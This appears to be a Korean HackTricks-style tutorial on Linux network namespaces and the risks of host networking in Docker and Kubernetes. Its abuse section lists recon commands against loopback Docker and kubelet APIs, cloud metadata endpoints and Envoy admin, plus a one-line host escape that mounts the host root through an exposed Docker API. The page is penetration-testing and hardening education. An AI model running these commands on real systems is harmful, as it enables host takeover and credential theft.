# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

Network namespace는 인터페이스, IP 주소, 라우팅 테이블, ARP/neighbor 상태, firewall 규칙, 소켓, UNIX-domain abstract socket namespace, 그리고 `/proc/net`과 같은 파일의 내용을 비롯한 네트워크 관련 리소스를 격리합니다. 따라서 container는 host의 실제 network stack을 소유하지 않고도 자체 `eth0`, 자체 로컬 route, 자체 loopback device를 가진 것처럼 동작할 수 있습니다.

보안 측면에서 이는 네트워크 격리가 단순히 port binding 이상의 의미를 갖기 때문에 중요합니다. Private network namespace는 workload가 직접 관찰하거나 재구성할 수 있는 대상을 제한합니다. 해당 namespace가 host와 공유되면 container는 갑자기 host listener, host-local service, abstract AF_UNIX endpoint, 그리고 애플리케이션에 노출될 의도가 없었던 network control point를 볼 수 있게 됩니다.

## 동작

새로 생성된 network namespace는 interface가 연결될 때까지 비어 있거나 거의 비어 있는 network environment로 시작합니다. 이후 container runtime은 virtual interface를 생성하거나 연결하고, address를 할당하며, workload가 예상한 connectivity를 갖도록 route를 구성합니다. Bridge 기반 deployment에서는 일반적으로 container가 host bridge에 연결된 veth-backed interface를 보게 됩니다. Kubernetes에서는 CNI plugin이 Pod networking에 해당하는 설정을 처리합니다.

이 아키텍처는 `--network=host` 또는 `hostNetwork: true`가 왜 그렇게 큰 변화인지 설명합니다. 준비된 private network stack을 전달받는 대신 workload가 host의 실제 network stack에 참여하게 됩니다.

## Lab

다음 명령으로 거의 비어 있는 network namespace를 확인할 수 있습니다:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
그리고 일반 컨테이너와 host-networked 컨테이너는 다음과 같이 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
호스트 네트워크를 사용하는 container는 더 이상 자체적으로 격리된 socket 및 interface view를 가지지 않습니다. 이 변경은 process에 어떤 capabilities가 있는지 확인하기 전에도 이미 상당히 중요합니다.

## Runtime 사용

Docker와 Podman은 별도로 구성하지 않는 한 일반적으로 각 container에 private network namespace를 생성합니다. Kubernetes는 보통 각 Pod에 자체 network namespace를 제공하며, 해당 Pod 내부의 container들이 이를 공유하지만 host와는 분리됩니다. 따라서 `127.0.0.1`은 일반적으로 container 단위가 아니라 Pod 단위입니다. 한 container에서 localhost에만 bind된 listener는 일반적으로 해당 Pod의 sidecar 및 다른 container에서 접근할 수 있습니다. Incus/LXC 시스템도 network namespace 기반의 강력한 isolation을 제공하며, virtual networking 구성의 종류가 더 다양한 경우가 많습니다.

일반적인 원칙은 private networking이 기본 isolation boundary이고, host networking은 해당 boundary를 명시적으로 해제하는 opt-out이라는 것입니다.

## Misconfigurations

가장 중요한 misconfiguration은 단순히 host network namespace를 공유하는 것입니다. 이는 성능, low-level monitoring 또는 편의를 위해 사용되기도 하지만, container에 제공되는 가장 명확한 boundary 중 하나를 제거합니다. Host-local listener에 더 직접적으로 접근할 수 있게 되고, localhost 전용 service가 접근 가능해질 수 있으며, `CAP_NET_ADMIN` 또는 `CAP_NET_RAW`와 같은 capabilities는 이를 통해 수행되는 작업이 이제 host 자체의 network environment에 적용되므로 훨씬 더 위험해집니다.

또 다른 문제는 network namespace가 private인 경우에도 network 관련 capabilities를 과도하게 부여하는 것입니다. Private namespace가 어느 정도 도움을 주기는 하지만, raw socket이나 고급 network control이 무해해지는 것은 아닙니다.

Kubernetes에서 `hostNetwork: true`는 Pod-level network segmentation을 얼마나 신뢰할 수 있는지도 변경합니다. Kubernetes 문서에 따르면 많은 network plugin은 `podSelector` / `namespaceSelector` matching에서 `hostNetwork` Pod의 traffic을 제대로 구분하지 못하며, 따라서 이를 일반적인 node traffic으로 처리합니다. Attacker 관점에서 이는 compromise된 `hostNetwork` workload를 overlay-network workload와 동일한 policy 가정에 의해 제한되는 일반적인 Pod가 아니라, node-level network foothold로 취급해야 하는 경우가 많다는 의미입니다.

## Abuse

Isolation이 취약한 setup에서 attacker는 host listening service를 확인하거나, loopback에만 bind된 management endpoint에 접근하거나, 정확한 capabilities와 environment에 따라 traffic을 sniff하거나 방해할 수 있습니다. `CAP_NET_ADMIN`이 있으면 routing 및 firewall state를 재구성할 수도 있습니다. Cluster에서는 이로 인해 lateral movement와 control-plane reconnaissance도 더 쉬워질 수 있습니다.

Host networking을 의심한다면, 먼저 표시되는 interface와 listener가 isolated container network가 아니라 host에 속하는지 확인하십시오:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback 전용 서비스는 종종 가장 먼저 발견되는 흥미로운 대상입니다:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets는 TCP/UDP listener처럼 보이지 않고 `/run` 아래에 filesystem path로 존재하지 않을 수도 있기 때문에 쉽게 놓치는 또 다른 대상입니다. 따라서 host-networked container는 container에 bind-mount된 적이 전혀 없는 host 전용 control channel에 대한 access를 상속할 수 있습니다:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
역사적인 예로는 `containerd-shim` abstract-socket 노출 버그가 있었지만, 특정 CVE보다 더 중요한 일반적인 교훈은 다음과 같습니다. workload가 host network namespace에 참여하면 abstract AF_UNIX 서비스도 attack surface의 일부가 됩니다. 해당 소켓이 runtime 관련 또는 administrative 용도로 보인다면 [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)로 pivot하세요.

network capabilities가 존재한다면 workload가 확인 가능한 stack을 inspect하거나 변경할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
최신 커널에서는 host networking과 `CAP_NET_ADMIN`이 단순한 `iptables` / `nftables` 변경을 넘어 packet path까지 노출할 수 있습니다. `tc` qdisc와 filter도 namespace-scoped이므로, 공유된 host network namespace에서는 해당 컨테이너가 볼 수 있는 host interface에 적용됩니다. `CAP_BPF`도 추가로 존재한다면 TC 및 XDP loader와 같은 네트워크 관련 eBPF program도 고려 대상이 됩니다:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
이는 공격자가 단순히 firewall rules를 다시 작성하는 데 그치지 않고, host interface 수준에서 traffic을 mirror, redirect, shape 또는 drop할 수 있기 때문에 중요합니다. private network namespace에서는 이러한 작업이 container view로 제한되지만, shared host namespace에서는 host에 영향을 미치게 됩니다.

cluster 또는 cloud 환경에서는 host networking으로 인해 metadata 및 control-plane-adjacent services에 대한 신속한 local recon도 정당화됩니다:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes에서는 multi-container Pod에서 **어떤** container라도 compromise하면, 전체 Pod가 하나의 network namespace를 공유하므로 sibling container와 sidecar가 열어 둔 localhost listener에도 접근할 수 있다는 점을 기억해야 합니다. 이는 admin 또는 debug interface가 cluster-wide가 아니라 의도적으로 Pod 내부에서만 사용되도록 구성된 service-mesh, observability 및 helper container에서 특히 중요합니다:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"localhost에 바인딩됨"을 **Pod-private**가 아닌 **container-private**로 간주하세요. Pod 내 컨테이너 하나가 compromise되면 이러한 가정은 더 이상 유효하지 않습니다.

### 전체 예시: Host Networking + Local Runtime / Kubelet Access

Host networking이 자동으로 host root를 제공하는 것은 아니지만, node 자체에서만 의도적으로 접근할 수 있도록 설정된 서비스를 노출하는 경우가 많습니다. 이러한 서비스 중 하나라도 보호가 취약하면, host networking은 직접적인 privilege-escalation 경로가 됩니다.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost에서 실행 중인 Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
영향:

- 적절한 보호 없이 local runtime API가 노출된 경우 직접적인 host compromise
- kubelet 또는 local agents에 접근할 수 있는 경우 cluster reconnaissance 또는 lateral movement
- `CAP_NET_ADMIN`과 결합된 경우 traffic manipulation 또는 denial of service

## 검사

이 검사의 목적은 해당 프로세스가 private network stack을 사용하는지, 어떤 routes와 listeners가 표시되는지, 그리고 capabilities를 테스트하기 전부터 network view가 이미 host-like하게 보이는지를 확인하는 것입니다.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
여기서 중요한 점:

- `/proc/self/ns/net`과 `/proc/1/ns/net`이 이미 호스트와 유사하게 보인다면, 컨테이너가 host network namespace 또는 다른 비공개가 아닌 namespace를 공유하고 있을 수 있습니다.
- 셸이 이미 이름이 지정된 namespace 또는 persistent namespace 내부에 있고, 호스트 측의 `/run/netns` 객체와 연관 지으려는 경우 `lsns -t net`과 `ip netns identify`가 유용합니다.
- `ss -lntup`은 loopback 전용 listener와 로컬 관리 endpoint를 보여 주므로 특히 유용합니다. `ss -xap`과 `/proc/net/unix`는 일반적인 파일시스템 socket 탐색으로는 찾지 못하는 abstract-socket 관점을 추가합니다.
- `CAP_NET_ADMIN`, `CAP_NET_RAW` 또는 `CAP_BPF`가 있다면 route, interface name, firewall context, `tc` state 및 eBPF attachment가 훨씬 중요해집니다.
- Kubernetes에서 `hostNetwork` Pod의 service-name resolution이 실패하는 경우, service가 존재하지 않아서가 아니라 Pod가 `dnsPolicy: ClusterFirstWithHostNet`을 사용하지 않기 때문일 수 있습니다.
- multi-container Pod에서는 localhost listener가 전체 Pod network namespace에 속하므로, loopback 전용 port가 compromised container에서 접근할 수 없다고 판단하기 전에 sidecar와 sibling container를 확인해야 합니다.

컨테이너를 검토할 때는 항상 network namespace를 capability set과 함께 평가해야 합니다. Host networking과 강력한 network capability가 결합된 상태는 bridge networking과 제한적인 default capability set이 결합된 상태와 보안 상황이 크게 다릅니다.

## References

- [Kubernetes NetworkPolicy 및 `hostNetwork` 관련 주의사항](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` 및 abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network container에 노출된 abstract Unix domain socket](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [network-related eBPF program에 필요한 eBPF token 및 capability 요구사항](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
